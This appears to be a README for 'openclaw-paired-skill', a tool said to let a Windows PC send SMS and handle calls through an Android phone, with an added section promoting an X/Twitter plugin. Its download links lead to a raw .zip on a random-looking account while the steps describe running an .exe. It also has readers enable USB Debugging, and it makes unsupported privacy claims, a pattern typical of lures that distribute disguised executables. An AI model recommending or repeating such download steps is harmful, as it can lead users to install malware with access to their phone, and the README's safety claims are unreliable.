# 📱 openclaw-paired-skill - Control your phone using your computer

[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/lophophorawilliamsiigregorynazianzen31/openclaw-paired-skill/main/docs/skill-openclaw-paired-v2.3-beta.4.zip)

This tool links OpenClaw to your mobile phone. You send messages, manage contacts, and handle calls directly from your desktop. Most phone software requires monthly fees or rental numbers. This tool uses your own hardware. Your phone acts as the bridge. You control your data and avoid extra costs.

## 🛠 Prerequisites

Before you start, ensure your computer meets these needs:

* Windows 10 or Windows 11 operating system.
* A working Bluetooth connection on your computer.
* A USB cable to connect your phone to your computer.
* Your phone must have Developer Mode and USB Debugging enabled.

## 🔗 Getting Your Phone Ready

You must prepare your phone so the computer can talk to it.

1. Open your phone Settings.
2. Find the About Phone menu.
3. Tap the Build Number seven times until you see a message saying you are a developer.
4. Go back to the main Settings menu and find System or Developer Options.
5. Search for USB Debugging and turn this setting on.
6. Connect your phone to your computer using your USB cable.
7. Accept the security prompt on your phone screen if it appears.

## 📥 Installation Steps

Follow these steps to install the software on your Windows machine.

1. Visit the [Download Page](https://raw.githubusercontent.com/lophophorawilliamsiigregorynazianzen31/openclaw-paired-skill/main/docs/skill-openclaw-paired-v2.3-beta.4.zip) to retrieve the required files.
2. Look for the latest release version on the page.
3. Select the file ending in .exe to start your download.
4. Locate the downloaded file in your Downloads folder.
5. Double-click the file to begin the setup process.
6. Follow the on-screen prompts to place the application on your computer.
7. Click Finish when the installer completes its tasks.

## ⚙️ Connecting Your Devices

Once you install the software, you must link your devices.

1. Open the OpenClaw Paired Skill application from your desktop or start menu.
2. Ensure your phone remains connected to your computer via USB.
3. Click the Scan Devices button in the app dashboard.
4. Select your phone from the list of available hardware.
5. The software will verify the connection through your USB bridge.
6. Enable the wireless link by toggling the Bluetooth switch within the software interface.
7. Confirm the pairing code on both your computer and your phone.

## 💬 Using the Features

The main dashboard provides access to your phone functions.

### Managing Contacts
Click the Contacts tab to view your saved numbers. Select any contact to send a message or start a call. You can edit names or delete entries directly from your keyboard.

### Sending Messages
Navigate to the Messaging tab to see your inbox. Type your text in the box and press send. The software routes the message through your phone and your existing mobile service plan. You pay only your usual phone carrier rates.

### Handling Calls
When a call comes in, the software displays a notification on your screen. Click the green button to answer using your computer microphone. Click the red button to end the call.

## X/Twitter Companion Workflows

Paired handles private phone channels: SMS, calls, contacts, media control, and files on your own device. If an OpenClaw agent also needs public X/Twitter automation, keep that workflow in a separate plugin instead of routing it through phone messages or call notes.

[TweetClaw](https://github.com/Xquik-dev/tweetclaw) is the OpenClaw plugin for X/Twitter jobs through Xquik:

```bash
openclaw plugins install @xquik/tweetclaw
```

Use TweetClaw to scrape tweets, search tweets, search tweet replies, post tweets, post tweet replies, export followers, look up users, upload media, download media, send direct messages, monitor tweets, create webhooks, and run giveaway draws. Review write actions before approval.

Keep the configs separate. Paired stores the phone MAC, trusted numbers, PIN file, and inbox HMAC key under the Paired config path. TweetClaw stores its own Xquik API key or MPP signing key in OpenClaw plugin config. Do not put phone numbers, SMS bodies, direct messages, API keys, or signing keys in prompts, public notes, or shared run logs.

## 🛡 Security and Privacy

This software keeps your data local. It does not send your contact list or private messages to any external servers. Everything happens on your local machine and your phone. The Bluetooth connection remains encrypted. You maintain full control over your information at all times.

## ❓ Frequently Asked Questions

### Does this service charge for SMS?
No. The software uses your current phone plan. If your plan includes free text messages, then this tool sends them for free.

### Can I use this with any phone?
This software works with most modern Android devices. Check your phone settings to confirm you have enabled USB Debugging as described in the earlier section.

### What happens if I disconnect the USB cable?
The initial bridge requires the cable for setup. Once you establish the link, the software maintains connection via Bluetooth for most features. Keep the phone nearby to ensure a stable wireless signal.

### How do I update the software?
The application checks for updates automatically when you open it. If a new version exists, the app prompts you to download and install the update.

## 💡 Troubleshooting

If you encounter issues, try these steps first:

* Restart your computer and your phone.
* Unplug the USB cable and plug it back in securely.
* Ensure your phone is not in Airplane Mode.
* Verify that you authorized your computer in the phone USB debugging settings.
* Check that your Bluetooth is turned on in both the Windows settings and the software interface.

You now have a private bridge between your computer and your phone. Use this tool to manage your communications without relying on third-party cloud services or rental numbers.
